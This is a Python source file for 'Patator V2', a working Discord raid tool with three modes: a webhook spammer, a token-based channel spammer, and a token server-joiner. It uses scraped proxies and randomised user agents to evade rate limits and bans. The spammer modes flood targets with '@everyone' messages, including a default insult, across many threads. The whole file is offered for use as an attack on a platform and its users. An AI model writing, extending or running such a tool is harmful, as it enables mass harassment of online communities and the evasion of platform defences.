import requests, random, os, json, fake_useragent
from update_check import update, isUpToDate
from colorama import Fore, Style, init
from threading import Thread
init()

class Update():
    def __init__(self):
        self.Update_files = {
            './README.md': 'https://raw.githubusercontent.com/Its-Vichy/Patator/main/README.md',
            './Patator.py': 'https://raw.githubusercontent.com/Its-Vichy/Patator/main/Patator.py',
            './Config/Config.json': 'https://raw.githubusercontent.com/Its-Vichy/Patator/main/Config/Config.json'
        }

    def Update(self):
        for files, url in self.Update_files.items():
            if isUpToDate(files, url) == False:
                update(files, url)

class Console():
    def __init__(self, title = 'github.com/its-vichy'):
        self.console_title = title

    def print_logo(self):
        os.system(f'title [Vichy] Patator V2 ~ {self.console_title}')
        os.system('cls' if os.name == 'nt' else 'clear')
        print('''       
         ____       _        _              __     ______  
        |  _ \ __ _| |_ __ _| |_ ___  _ __  \ \   / /___ \ 
        | |_) / _` | __/ _` | __/ _ \| '__|  \ \ / /  __) |
        |  __/ (_| | || (_| | || (_) | |      \ V /  / __/ 
        |_|   \__,_|\__\__,_|\__\___/|_|       \_/  |_____| github.com/its-vichy
                                                        
        [1] Webhook Spammer.
        [2] Token Spammer.
        [3] Token Joiner.
        '''.replace('its-vichy', f'{Fore.RED}its-vichy{Fore.WHITE}').replace('1', f'{Fore.CYAN}1{Fore.WHITE}').replace('2', f'{Fore.CYAN}2{Fore.WHITE}').replace('3', f'{Fore.CYAN}3{Fore.WHITE}'))

    def printer(self, badge, text, finish = '.', color = Fore.CYAN, Isinput = False):
        if Isinput == True:
            return input(f'{Fore.WHITE}[{color}{badge}{Fore.WHITE}] {text}{Fore.WHITE} ~~> ')
        else:
            print(f'{Fore.WHITE}[{color}{badge}{Fore.WHITE}] {text}{Fore.WHITE}{finish}')

class Proxy():
    def __init__(self, proxy_file = './Config/Proxies.txt'):
        self.proxy_file = proxy_file
        self.proxy_list = []
        self.console = Console()

    def get_proxy_number(self):
        return len(self.proxy_list)

    def get_user_agent(self):
        from fake_useragent import UserAgent
        return UserAgent().random

    def load_proxy(self):
        Duplicate = 0
        with open(self.proxy_file, 'r+') as proxy_files:
            for proxy in proxy_files:
                proxy = proxy.split('\n')[0]
                if proxy not in self.proxy_list:
                    self.proxy_list.append(proxy)
                else:
                    Duplicate += 1
        
        self.console.printer('*', f'{self.get_proxy_number()} proxies was load from {self.proxy_file} file, {Duplicate} duplicate proxies was removed', color= Fore.MAGENTA)

    def scrape_proxy(self):
        before_number = self.get_proxy_number()
        i = 0
        http = 0
        http_s = 0
        socks4 = 0
        socks5 = 0
        unknow = 0
        with open('./Config/Config.json') as config_file:
            config = json.load(config_file)

            for Owner, Url in config['ProxyScrapeUrls'].items():
                Proxies = requests.get(Url).text.split('\n')
                i += 1
                for Proxy in Proxies:
                    Proxy = Proxy.strip()
                    
                    if Proxy not in self.proxy_list:
                    
                        Type = Owner.split('-')[1]
                        
                        if  Type == 'All':
                            self.proxy_list.append(Proxy)
                            unknow += 1
                        elif Type == 'Http':
                            self.proxy_list.append(f'http://{Proxy}')
                            http += 1
                        elif Type == 'Https':
                            self.proxy_list.append(f'https://{Proxy}')
                            http_s += 1
                        elif Type == 'Socks4':
                            self.proxy_list.append(f'socks4://{Proxy}')
                            socks4 += 1
                        elif Type == 'Socks5':
                            self.proxy_list.append(f'socks5://{Proxy}')
                            socks5 += 1

        self.console.printer('*', f'{self.get_proxy_number() - before_number} proxies was scraped from {i} url(s) ({unknow} Unknow | {http} http | {http_s} https | {socks4} socks4 | {socks5} socks5)', color= Fore.MAGENTA)
            
    def get_random_proxy(self):
        proxy = random.choice(self.proxy_list)
        return proxy, dict({'http' : proxy, 'https' : proxy})

    def remove_proxy(self, proxy):
        self.proxy_list.remove(proxy)

class Spammer():
    def __init__(self, console, proxy_manager, token_file = './Config/Tokens.txt', webhook_file = './Config/Hook.txt'):
        self.token_file = token_file
        self.hook_file = webhook_file
        self.proxy_manager = proxy_manager
        self.console = console
        self.hook_list = []
        self.token_list = []
        self.temp_token = []

    def load_hook(self):
        i = 0
        with open(self.hook_file, 'r+') as hook_files:
            for hook in hook_files:
                hook = hook.split('\n')[0]
                if hook not in self.hook_list:
                    self.hook_list.append(hook)
                    i += 1
        self.console.printer('*', f'{i} hook(s) was load from {self.hook_file} file')
        
    def load_tokens(self):
        i = 0
        with open('./Config/Tokens.txt', 'r+') as token_file:
            for token in token_file:
                token = token.split('\n')[0]
                if token not in self.token_list:
                    self.token_list.append(token)
                    i += 1
        self.console.printer('*', f'{i} token(s) was load from {self.token_file} file')

    def destroy_temp(self):
        self.temp_token.pop()

    def spam_webhook(self):
        while True:
            try:
                hook = random.choice(self.hook_list)
                raw, proxy = self.proxy_manager.get_random_proxy()
                
                Resp = requests.post(hook, headers= {'content-type': 'application/json', 'user-agent': self.proxy_manager.get_user_agent()}, data= json.dumps({'content': '@everyone LMAO'}), proxies=dict(proxy), timeout= 3500).status_code

                if Resp == 204:
                    self.console.printer('+', f'Hook sent with {raw}', ' !', Fore.GREEN)
                elif Resp == 429:
                    self.console.printer('~', f'Rate limited with {raw}', ' :(', Fore.YELLOW)
                else:
                    self.console.printer('!', f'CloudFare banned with proxy {raw}', ' !', Fore.RED)

            except:
                pass

    def spam_token(self, channel, message):
        if message == '':
            message = '> ||@everyone|| **Fucked by Patator.**'
        while True:
            try:
                token = random.choice(self.token_list)
                raw, proxy = self.proxy_manager.get_random_proxy()
                
                Resp = requests.post(f'https://discord.com/api/v8/channels/{channel}/messages', headers= {'authorization': token, 'user-agent': self.proxy_manager.get_user_agent(), 'content-type': 'application/json'}, data= json.dumps({'content': message}), proxies=dict(proxy), timeout= 3500).status_code

                if Resp == 200:
                    self.console.printer('+', f'Message sent with {raw}', ' !', Fore.GREEN)
                elif Resp == 429:
                    self.console.printer('~', f'Rate limited with {raw}', ' :(', Fore.YELLOW)
                elif Resp == 403:
                    self.console.printer('~', f'Token not in server, removing from the list', ' #', Fore.YELLOW)
                    self.token_list.remove(token)
                else:
                    self.console.printer('!', f'CloudFare banned with proxy {raw}', ' !', Fore.RED)

            except:
                pass

    def join_token(self, invite_code):
        while len(self.temp_token) != len(self.token_list):
            try:
                token = random.choice(self.token_list)
                raw, proxy = self.proxy_manager.get_random_proxy()
                if token not in self.temp_token:
                    Resp = requests.post(f'https://discord.com/api/v8/invites/{invite_code}', headers= {'authorization': token.strip(), 'user-agent': self.proxy_manager.get_user_agent(),  'content-type': 'application/json'} , proxies=dict(proxy), timeout= 3500).status_code

                    if Resp == 200:
                        self.console.printer('+', f'Server joined with {raw}', ' !', Fore.GREEN)
                        self.temp_token.append(token)
                    elif Resp == 429:
                        self.console.printer('~', f'Rate limited with {raw}', ' :(', Fore.YELLOW)
                    elif Resp == 401:
                        self.console.printer('~', f'Invalid token with {raw}', ' :(', Fore.YELLOW)
                        self.token_list.remove(token)
                    elif Resp == 403:
                        self.console.printer('~', f'Invalid token with {raw}', ' :(', Fore.YELLOW)
                        self.token_list.remove(token)
                    else:
                        self.console.printer('!', f'CloudFare banned with proxy {raw}', ' !', Fore.RED)
                else:
                    print('joined')

            except:
                pass

    def start_spammer(self, threads_number, choice, invite_code = None, channel = None, messsage = '> ||@everyone|| **Get rekt with Patator (https://github.com/Its-Vichy/Patator)**'):
        ThreadList = []

        args_ = None

        if choice == 1:
            TargetCmd = self.spam_webhook
        elif choice == 2:
            TargetCmd = self.spam_token
            args_ = (channel, messsage,)
        elif choice == 3:
            TargetCmd = self.join_token
            args_ = (invite_code, )

        for _ in range(threads_number):
            if args_ is None:
                T = Thread(target=TargetCmd)
            else:
                T = Thread(target=TargetCmd, args=(args_))
            ThreadList.append(T)

        for Threads in ThreadList:
            Threads.start()

class Main():
    def __init__(self, scrape_proxies, user_token, webhook_threads, spammer_threads, joiner_threads):
        self.webhook_threads = webhook_threads
        self.spammer_threads = spammer_threads
        self.joiner_threads  = joiner_threads
        self.user_token      = user_token
        self.console         = Console()
        self.proxy_manager   = Proxy()
        self.spammer         = Spammer(self.console, self.proxy_manager)

    def initialize(self):
        self.console.print_logo()
        self.proxy_manager.scrape_proxy()
        self.proxy_manager.load_proxy()
        self.spammer.load_hook()
        self.spammer.load_tokens()

    def Parser(self):
        while True:
            Resp = int(self.console.printer('?', 'Choose an option', color= Fore.YELLOW, Isinput= True))
            
            # Spam webhook
            if Resp == 1:
                self.console.printer('*', f'Starting webhook spammer with {self.webhook_threads} thread(s)', color= Fore.MAGENTA)
                self.spammer.start_spammer(self.webhook_threads, Resp)
            
            # Token spammer
            elif Resp == 2:
                channel_id = self.console.printer('?', f'Target channel ID', color= Fore.YELLOW, Isinput= True)
                message = self.console.printer('?', f'Message to sent (can skip)', color= Fore.YELLOW, Isinput= True)
                self.console.printer('*', f'Starting channel spammer with {self.spammer_threads} thread(s)', color= Fore.MAGENTA)
                self.spammer.start_spammer(self.spammer_threads, Resp, channel= channel_id, messsage= message)
            
            # Token joiner
            elif Resp == 3:
                discord_invite = self.console.printer('?', f'Discord server invite', color= Fore.YELLOW, Isinput= True)

                if '.gg/' in discord_invite:
                    discord_invite = discord_invite.split('.gg/')[1]
                
                self.console.printer('*', f'Starting joining with discord.gg/{discord_invite} with {self.joiner_threads} thread(s)', color= Fore.MAGENTA)
                self.spammer.start_spammer(self.joiner_threads, Resp, invite_code=discord_invite)

def main():
    #Installer = Update()
    #Installer.Update()

    with open('./Config/Config.json', 'r+') as config_file:
        config = json.load(config_file)

        Tool = Main(config['ScrapeProxies'], config['Token'], config['WebhoockThreads'], config['SpammerThreads'], config['JoinerThreads'])
        Tool.initialize()
        Tool.Parser()

if __name__ == '__main__':
    main()
